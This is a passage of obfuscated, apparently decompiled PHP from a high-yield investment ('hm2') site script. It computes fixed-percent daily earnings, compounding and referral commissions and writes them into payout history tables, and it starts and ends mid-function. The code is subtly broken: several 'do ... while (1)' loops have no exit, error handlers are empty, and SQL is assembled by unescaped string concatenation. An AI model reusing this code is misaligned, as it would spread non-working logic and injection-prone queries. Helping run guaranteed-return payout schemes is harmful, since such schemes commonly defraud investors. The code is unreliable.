                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyahNc'] )
                        {
                            $elnlcWtdA = " 3 month ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlczvayB'] )
                        {
                            $elnlcWtdA = " 6 month ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlctoLR'] )
                        {
                            $elnlcWtdA = " 1 year ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcipPS'] )
                        {
                            $elnlcWtdA = " ".$elnlcPSitf[$elnlcbhAzL['elnlcQDdo']]." day ";
                        }
                        if ( $elnlcWsKAT == 0 && $elnlcWtdA == "" )
                        {
                            continue;
                        }
                        $elnlcStkU = -1;
                        $q = "select weekday('".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA}) as dw";
                        if ( !( $elnlclKGO = mysql_query( $q ) ) )
                        {
                        }
                        while ( $elnlcfEdPE = mysql_fetch_array( $elnlclKGO ) )
                        {
                            $elnlcStkU = $elnlcfEdPE[$elnlcbhAzL['elnlclkwD']];
                        }
                        $q = "select count(id) as col from hm2_history where ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? " date_format(date, '%Y-%m-%d %H') = date_format('".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA}, '%Y-%m-%d %H') and" : "to_days(date) = to_days('".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA}) and " )." deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                        if ( !( $elnlcchef = mysql_query( $q ) ) )
                        {
                        }
                        $elnlcLnDHe = $elnlcbhAzL['elnlcSFKV'];
                        while ( $elnlcyjJG = mysql_fetch_array( $elnlcchef ) )
                        {
                            $elnlcLnDHe = $elnlcyjJG[$elnlcbhAzL['elnlczFIa']];
                        }
                        if ( $elnlcLnDHe == 0 )
                        {
                            if ( 5 <= $elnlcStkU && $elnlcPSitf[$elnlcbhAzL['elnlcfbihT']] == 1 )
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                    amount = 0,\r\n                    type = 'earning',\r\n                    description = 'No interest on ".( $elnlcStkU == 5 ? "Saturday" : "Sunday" )."',\r\n                    actual_amount = 0,\r\n                    date = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                    ec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                    str = 'gg',\r\n                    deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                            }
                            else
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                    amount = {$elnlczQGd},\r\n                    type = 'earning',\r\n                    description = 'Earning from deposit ".$elnlctVnzQ[$elnlcbhAzL['elnlcQsqts']].number_format( $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']], 2 )." - {$elnlcWsKAT} %',\r\n                    actual_amount = {$elnlczQGd},\r\n                    date = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                    ec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                    str = 'gg',\r\n                    deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                            }
                            if ( !mysql_query( $q ) )
                            {
                            }
                        }
                        $elnlcooIpx = "";
                        if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcipPS'] )
                        {
                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcQeSi']] == 0 || $elnlcPSitf[$elnlcbhAzL['elnlcQeSi']] && $elnlcPSitf[$elnlcbhAzL['elnlcQKWvM']] )
                            {
                                $elnlcooIpx = ", status = 'off'";
                            }
                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcUFbp']] == 1 && ( $elnlcPSitf[$elnlcbhAzL['elnlcQeSi']] == 0 || $elnlcPSitf[$elnlcbhAzL['elnlcQeSi']] && $elnlcPSitf[$elnlcbhAzL['elnlcQKWvM']] ) )
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                    amount = ".$elnlcPSitf[$elnlcbhAzL['elnlcowtbp']].",\r\n                    type='release_deposit',\r\n                    actual_amount = ".$elnlcPSitf[$elnlcbhAzL['elnlcowtbp']].",\r\n                    ec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                    date = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                    deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                                if ( !mysql_query( $q ) )
                                {
                                }
                            }
                        }
                        else
                        {
                            if ( 5 <= $elnlcStkU && $elnlcPSitf[$elnlcbhAzL['elnlcfbihT']] == 1 )
                            {
                            }
                            else
                            {
                                if ( 0 < $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] && $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] <= 100 && $elnlcPSitf[$elnlcbhAzL['elnlcVcEzr']] == 1 )
                                {
                                    if ( $elnlcPSitf[$elnlcbhAzL['elnlcvpTI']] == 0 )
                                    {
                                        $elnlcPSitf[$elnlcbhAzL['elnlcvpTI']] = $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] + 1;
                                    }
                                    if ( $elnlcPSitf[$elnlcbhAzL['elnlcfVHWz']] <= $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] && $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] <= $elnlcPSitf[$elnlcbhAzL['elnlcvpTI']] )
                                    {
                                        if ( $elnlcPSitf[$elnlcbhAzL['elnlcQaJPf']] == 1 )
                                        {
                                            $elnlcBtEC = preg_split( "/\\s*,\\s*/", $elnlcPSitf[$elnlcbhAzL['elnlcUwMaB']] );
                                            if ( !in_array( $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']], $elnlcBtEC ) )
                                            {
                                                $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] = $elnlcBtEC[0];
                                            }
                                        }
                                        else
                                        {
                                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] < $elnlcPSitf[$elnlcbhAzL['elnlcpFPq']] )
                                            {
                                                $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] = $elnlcPSitf[$elnlcbhAzL['elnlcpFPq']];
                                            }
                                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcscIHA']] < $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] )
                                            {
                                                $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] = $elnlcPSitf[$elnlcbhAzL['elnlcscIHA']];
                                            }
                                        }
                                    }
                                    else
                                    {
                                        $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] = $elnlcbhAzL['elnlcSFKV'];
                                    }
                                    if ( 0 < $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] && $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] <= 100 )
                                    {
                                        $elnlczpPvP = $elnlczQGd * $elnlcPSitf[$elnlcbhAzL['elnlcuhKmr']] / 100;
                                        $elnlczQGd = floor( ( floor( $elnlczQGd * 100000 ) / 100000 - floor( $elnlczpPvP * 100000 ) / 100000 ) * 100 ) / 100;
                                        $q = "insert into hm2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                        amount = -{$elnlczpPvP},\r\n                    \t\ttype='deposit',\r\n                    \t\tdescription = 'Compounding deposit',\r\n                    \t\tactual_amount = -{$elnlczpPvP},\r\n                    \t\tec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                    \t\tdate = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                                deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                                        if ( !mysql_query( $q ) )
                                        {
                                        }
                                        $q = "update hm2_deposits set amount = amount + {$elnlczpPvP},\r\n                    \t\tactual_amount = actual_amount + {$elnlczpPvP}\r\n                    \t\twhere id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                                        if ( !mysql_query( $q ) )
                                        {
                                        }
                                    }
                                }
                                elnlcyioda( $elnlcPSitf[$elnlcbhAzL['elnlcIGomq']], $elnlczQGd, "date = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA}" );
                            }
                        }
                        $q = "update hm2_deposits set \r\n      \tq_pays = q_pays + 1, \r\n      \tlast_pay_date = last_pay_date + interval {$elnlcWtdA} {$elnlcooIpx} where id =".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                        if ( !mysql_query( $q ) )
                        {
                        }
                    }
                } while ( 1 );
            }
            $q = "select * from hm2_types where q_days > 0";
            $elnlcRLPe = mysql_query( $q );
            do
            {
                if ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
                {
                    if ( $elnlcPSitf[$elnlcbhAzL['elnlcfbihT']] == 1 )
                    {
                        $elnlcgsDC = floor( $elnlcPSitf[$elnlcbhAzL['elnlcQDdo']] / 5 ) * 7 + $elnlcPSitf[$elnlcbhAzL['elnlcQDdo']] % 5;
                        $elnlcDIbqv = $elnlcPSitf[$elnlcbhAzL['elnlcrplh']] - ( 0 < $elnlcPSitf[$elnlcbhAzL['elnlcrplh']] ? 1 : 0 );
                        $elnlcohEsp = " ({$elnlcgsDC} + (({$elnlcPSitf[$elnlcbhAzL['elnlcQDdo']]} % 5 + WEEKDAY(deposit_date)) > 5)*2 + {$elnlcDIbqv}) ";
                    }
                    else
                    {
                        $elnlcgsDC = $elnlcPSitf[$elnlcbhAzL['elnlcQDdo']] + $elnlcPSitf[$elnlcbhAzL['elnlcrplh']] - ( 0 < $elnlcPSitf[$elnlcbhAzL['elnlcrplh']] ? 1 : 0 );
                        $elnlcohEsp = " {$elnlcgsDC} ";
                    }
                    $elnlclrarK = $elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                    if ( $elnlcPSitf[$elnlcbhAzL['elnlcUFbp']] == 1 )
                    {
                        $q = "select * from hm2_deposits where \r\n                type_id = {$elnlclrarK} and \r\n                status = 'on' and \r\n                user_id = {$elnlcBpRxC} and \r\n                (\r\n                   deposit_date + interval {$elnlcohEsp} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" )." < last_pay_date\r\n                      or\r\n                   deposit_date + interval {$elnlcohEsp} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" )." < now()\r\n                )\r\n                and\r\n                (\r\n                   ({$elnlcPSitf[$elnlcbhAzL['elnlcQeSi']]} = 0) || ({$elnlcPSitf[$elnlcbhAzL['elnlcQeSi']]} && (deposit_date + interval {$elnlcPSitf[$elnlcbhAzL['elnlcKryj']]} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" )." < now())))\r\n             ";
                        $elnlcHAEbv = mysql_query( $q );
                        while ( $elnlcukjg = mysql_fetch_array( $elnlcHAEbv ) )
                        {
                            $q = "insert into hm2_history set\r\n                user_id = ".$elnlcukjg[$elnlcbhAzL['elnlcPqCb']].",\r\n      \t\tamount = ".$elnlcukjg[$elnlcbhAzL['elnlcowtbp']].",\r\n      \t\ttype='release_deposit',\r\n      \t\tactual_amount = ".$elnlcukjg[$elnlcbhAzL['elnlcowtbp']].",\r\n                ec = ".$elnlcukjg[$elnlcbhAzL['elnlcLlqz']].",\r\n      \t\tdate = '".$elnlcukjg[$elnlcbhAzL['elnlcwtbS']]."' + interval {$elnlcgsDC} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" ).",\r\n                deposit_id = ".$elnlcukjg[$elnlcbhAzL['elnlcIGomq']];
                            if ( !mysql_query( $q ) )
                            {
                            }
                        }
                    }
                    $q = "update hm2_deposits set status='off' where \r\n             user_id = {$elnlcBpRxC} and \r\n    \t       (deposit_date + interval {$elnlcohEsp} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" )." < last_pay_date\r\n                  or\r\n                deposit_date + interval {$elnlcohEsp} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" )." < now()) and\r\n               (({$elnlcPSitf[$elnlcbhAzL['elnlcQeSi']]} = 0) || ({$elnlcPSitf[$elnlcbhAzL['elnlcQeSi']]} && (deposit_date + interval {$elnlcPSitf[$elnlcbhAzL['elnlcKryj']]} ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? "hour" : "day" )." < now()))) and\r\n             type_id = {$elnlclrarK}\r\n           ";
                    if ( !mysql_query( $q ) )
                    {
                    }
                }
            } while ( 1 );
        }
    }
}

function elnlcczrfc( $elnlcomuon )
{
    global $elnlcbhAzL;
    global $elnlctVnzQ;
    $elnlcySAk = array( );
    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcbpUa']] == 1 && $elnlcomuon != -2 )
    {
    }
    else
    {
        $q = "select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = 'on' and hm2_types.id = hm2_plans.parent order by parent, min_deposit";
        if ( !( $elnlcRLPe = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
        {
            $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcxFqC']]][$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']]] = $elnlcPSitf;
        }
        $elnlcbUPoI = $elnlcbhAzL['elnlcRlJry'];
        $elnlcVDoJN = "u.last_access_time + interval 30 minute < now() ";
        if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcnzRUV'] )
        {
            $elnlczubvN = "t.send_profit_to_stocks,t.send_percent_to_stocks";
            $elnlcLTbd = " t.pay_by_button = 0 and";
        }
        if ( $elnlcomuon == -1 )
        {
            $elnlcVDoJN = "1 = 1";
            $q = "select * from hm2_users where l_e_t + interval 15 minute < now() and status = 'on'";
        }
        else
        {
            $q = "select * from hm2_users where id = {$elnlcomuon} and status = 'on'";
        }
        if ( $elnlcomuon == -2 )
        {
            $q = "select * from hm2_users where status = 'on'";
            $q = "select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id";
        }
        if ( !( $elnlchwCbb = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcEhri = mysql_fetch_array( $elnlchwCbb ) )
        {
            $elnlcBpRxC = $elnlcEhri[$elnlcbhAzL['elnlcIGomq']];
            $elnlclfiDM = fopen( "./tmpl_c/lock_user{$elnlcBpRxC}", "w+" );
            if ( flock( $elnlclfiDM, LOCK_EX ) )
            {
            }
            else
            {
                fclose( $elnlclfiDM );
                continue;
            }
            $q = "update hm2_users set l_e_t = now() where id = {$elnlcBpRxC}";
            if ( !mysql_query( $q ) )
            {
            }
            $elnlcbUPoI = $elnlcbhAzL['elnlcRlJry'];
            $q = "select max(p.min_deposit) as min_deposit, p.parent as type_id from hm2_plans as p group by p.parent";
            if ( !( $elnlcRLPe = mysql_query( $q ) ) )
            {
            }
            while ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
            {
                $q = "select max_deposit as max_amount from hm2_plans where parent = {$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]} and min_deposit = {$elnlcPSitf[$elnlcbhAzL['elnlchHBj']]}";
                if ( !( $elnlclKGO = mysql_query( $q ) ) )
                {
                }
                do
                {
                    if ( $elnlcfEdPE = mysql_fetch_array( $elnlclKGO ) )
                    {
                        $elnlcDIoHk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] = $elnlcfEdPE[$elnlcbhAzL['elnlcaJQt']];
                    }
                } while ( 1 );
            }
            while ( 0 < $elnlcbUPoI )
            {
                $q = "select \r\n              d.*, \r\n              t.period as period, t.use_compound as use_compound,\r\n              t.compound_min_deposit, t.compound_max_deposit,\r\n              t.compound_min_percent, t.compound_max_percent,\r\n              t.compound_percents_type, t.compound_percents,\r\n/*              t.rpcp as rpcp,*/\r\n              t.work_week as work_week,\r\n              t.q_days as q_days, t.withdraw_principal,\r\n              t.delay as delay,\r\n              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,\r\n              {$elnlczubvN}\r\n              t.return_profit as return_profit,\r\n              t.return_profit_percent as return_profit_percent\r\n            from\r\n              hm2_deposits as d,\r\n              hm2_types as t,\r\n              hm2_users as u\r\n            where \r\n              u.id = {$elnlcBpRxC} and \r\n              u.status = 'on' and \r\n              d.status='on' and \r\n              d.type_id = t.id and \r\n              t.status = 'on' and \r\n              u.id = d.user_id and\r\n              {$elnlcLTbd}\r\n              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = 'h', 60*60, 60*60*24))) or t.q_days = 0) and \r\n              (\r\n                (d.last_pay_date + interval 1 hour <= now() and t.period = 'h')or\r\n                (d.last_pay_date + interval 1 day <= now() and t.period = 'd')or\r\n                (d.last_pay_date + interval 7 day <= now() and t.period = 'w') or\r\n                (d.last_pay_date + interval 14 day <= now() and t.period = 'b-w') or\r\n                (d.last_pay_date + interval 1 month <= now() and t.period = 'm') or\r\n                (d.last_pay_date + interval 2 month <= now() and t.period = '2m') or\r\n                (d.last_pay_date + interval 3 month <= now() and t.period = '3m') or\r\n                (d.last_pay_date + interval 6 month <= now() and t.period = '6m') or\r\n                (d.last_pay_date + interval 1 year <= now() and t.period = 'y') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = 'end') \r\n              ) and\r\n              ((t.q_days = 0) or \r\n                (               \r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = 'h') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = 'd') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = 'w') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = 'b-w') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = 'm') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = '2m') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = '3m') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = '6m') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = 'y') or\r\n                (t.q_days > 0 and t.period = 'end') \r\n              ))";
                if ( !( $elnlcRLPe = mysql_query( $q ) ) )
                {
                }
                $elnlcbUPoI = $elnlcbhAzL['elnlcSFKV'];
                do
                {
                    if ( $elnlcPSitf = mysql_fetch_array( $elnlcRLPe ) )
                    {
                        ++$elnlcbUPoI;
                        if ( !isset( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] ) )
                        {
                            continue;
                        }
                        $elnlcWsKAT = $elnlcbhAzL['elnlcSFKV'];
                        $elnlcitPK = $elnlcbhAzL['elnlcSFKV'];
                        reset( $elnlcySAk );
                        reset( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] );
                        $elnlcBsLS = each( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] )[1];
                        $elnlchcOIm = each( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] )[0];
                        while ( each( $elnlcySAk[$elnlcPSitf[$elnlcbhAzL['elnlcDqgVD']]] ) )
                        {
                            if ( $elnlcBsLS[$elnlcbhAzL['elnlchHBj']] <= $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] && ( $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] <= $elnlcBsLS[$elnlcbhAzL['elnlcMLzNf']] || $elnlcBsLS[$elnlcbhAzL['elnlcMLzNf']] == 0 ) )
                            {
                                $elnlcWsKAT = $elnlcBsLS[$elnlcbhAzL['elnlcgFxbx']];
                            }
                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] < $elnlcBsLS[$elnlcbhAzL['elnlchHBj']] && $elnlcWsKAT == 0 )
                            {
                                $elnlcWsKAT = $elnlcitPK;
                            }
                            if ( $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] < $elnlcBsLS[$elnlcbhAzL['elnlchHBj']] && 0 < $elnlcWsKAT )
                            {
                                break;
                            }
                            $elnlcitPK = $elnlcBsLS[$elnlcbhAzL['elnlcgFxbx']];
                        }
                        if ( $elnlcBsLS[$elnlcbhAzL['elnlcMLzNf']] != 0 && $elnlcBsLS[$elnlcbhAzL['elnlcMLzNf']] < $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] )
                        {
                            $elnlcWsKAT = $elnlcitPK;
                        }
                        $elnlczQGd = $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] * $elnlcWsKAT / 100;
                        $elnlcWtdA = "";
                        if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcWjfoP'] )
                        {
                            $elnlcWtdA = " 1 day ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] )
                        {
                            $elnlcWtdA = " 1 hour ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcwsmEy'] )
                        {
                            $elnlcWtdA = " 7 day ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == "b-w" )
                        {
                            $elnlcWtdA = " 14 day ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcwRWaa'] )
                        {
                            $elnlcWtdA = " 1 month ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlccrvf'] )
                        {
                            $elnlcWtdA = " 2 month ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyahNc'] )
                        {
                            $elnlcWtdA = " 3 month ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlczvayB'] )
                        {
                            $elnlcWtdA = " 6 month ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlctoLR'] )
                        {
                            $elnlcWtdA = " 1 year ";
                        }
                        else if ( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcipPS'] )
                        {
                            $elnlcWtdA = " ".$elnlcPSitf[$elnlcbhAzL['elnlcQDdo']]." day ";
                        }
                        if ( $elnlcWsKAT == 0 && $elnlcWtdA == "" )
                        {
                            continue;
                        }
                        $elnlcStkU = -1;
                        $q = "select weekday('".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA}) as dw";
                        if ( !( $elnlclKGO = mysql_query( $q ) ) )
                        {
                        }
                        while ( $elnlcfEdPE = mysql_fetch_array( $elnlclKGO ) )
                        {
                            $elnlcStkU = $elnlcfEdPE[$elnlcbhAzL['elnlclkwD']];
                        }
                        $q = "select count(id) as `col` from hm2_history where \r\n\t\ttype = 'earning' and ".( $elnlcPSitf[$elnlcbhAzL['elnlcKULDN']] == $elnlcbhAzL['elnlcyxnAF'] ? " date_format(date, '%Y-%m-%d  %H') = date_format('".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA}, '%Y-%m-%d  %H') and" : "to_days(date) = to_days('".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA}) and " )." deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                        if ( !( $elnlcchef = mysql_query( $q ) ) )
                        {
                        }
                        $elnlcLnDHe = $elnlcbhAzL['elnlcSFKV'];
                        while ( $elnlcyjJG = mysql_fetch_array( $elnlcchef ) )
                        {
                            $elnlcLnDHe = $elnlcyjJG[$elnlcbhAzL['elnlczFIa']];
                        }
                        if ( $elnlcLnDHe == 0 )
                        {
                            if ( 5 <= $elnlcStkU && $elnlcPSitf[$elnlcbhAzL['elnlcfbihT']] == 1 )
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                    amount = 0,\r\n                    type = 'earning',\r\n                    description = 'No interest on ".( $elnlcStkU == 5 ? "Saturday" : "Sunday" )."',\r\n                    actual_amount = 0,\r\n                    date = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                    ec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                    str = 'gg',\r\n                    deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                                if ( !mysql_query( $q ) )
                                {
                                }
                            }
                            else
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcPqCb']].",\r\n                    amount = {$elnlczQGd},\r\n                    type = 'earning',\r\n                    description = 'Earning from deposit ".$elnlctVnzQ[$elnlcbhAzL['elnlcQsqts']].number_format( $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']], 2 )." - {$elnlcWsKAT} %',\r\n                    actual_amount = {$elnlczQGd},\r\n                    date = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                    ec = ".$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']].",\r\n                    str = 'gg',\r\n                    deposit_id = ".$elnlcPSitf[$elnlcbhAzL['elnlcIGomq']];
                                if ( !mysql_query( $q ) )
                                {
                                }
                                if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcuRdt'] && 0 < $elnlcEhri[$elnlcbhAzL['elnlcJQPVe']] && 0 < $elnlctVnzQ[$elnlcbhAzL['elnlciNTI']] )
                                {
                                    $elnlcdsrpz = $elnlczQGd * $elnlctVnzQ[$elnlcbhAzL['elnlciNTI']] / 100;
                                    $elnlcPOwS = elnlcdjxb( $elnlcEhri[$elnlcbhAzL['elnlclrlET']] );
                                    if ( $elnlctVnzQ[$elnlcbhAzL['elnlcSAxP']] <= $elnlcPSitf[$elnlcbhAzL['elnlcowtbp']] )
                                    {
                                        $q = "select max(actual_amount) as maxam from hm2_deposits where user_id = {$elnlcEhri[$elnlcbhAzL['elnlcJQPVe']]} and status = 'on'";
                                        if ( !( $elnlclKGO = mysql_query( $q ) ) )
                                        {
                                        }
                                        $elnlcyfPav = $elnlcbhAzL['elnlcSFKV'];
                                        while ( $elnlcfEdPE = mysql_fetch_array( $elnlclKGO ) )
                                        {
                                            $elnlcyfPav = $elnlcfEdPE[$elnlcbhAzL['elnlcCfWGg']];
                                        }
                                        if ( $elnlctVnzQ[$elnlcbhAzL['elnlcSCVW']] <= $elnlcyfPav )
                                        {
                                            $q = "insert into hm2_history set user_id = {$elnlcEhri[$elnlcbhAzL['elnlcJQPVe']]},\r\n\t\t\tamount = {$elnlcdsrpz},\r\n\t\t\ttype = 'commissions',\r\n\t\t\tdescription = 'Daily referral earning from user {$elnlcPOwS}',\r\n\t\t\tactual_amount = {$elnlcdsrpz},\r\n\t\t\tdate = '".$elnlcPSitf[$elnlcbhAzL['elnlcDSgst']]."' + interval {$elnlcWtdA},\r\n                        ec = {$elnlcPSitf[$elnlcbhAzL['elnlcLlqz']]},\r\n\t\t\tstr = 'gg'";
                                            if ( !mysql_query( $q ) )
                                            {
                                            }
                                        }
                                    }
                                }
                                if ( $elnlctVnzQ[$elnlcbhAzL['elnlccmud']] == $elnlcbhAzL['elnlcnzRUV'] && $elnlcPSitf[$elnlcbhAzL['elnlczKwM']] )
                                {
                                    $elnlcaoFzc = floor( $elnlczQGd * $elnlcPSitf[$elnlcbhAzL['elnlcCswz']] ) / 100;
                                    if ( 0 < $elnlcaoFzc )
                                    {
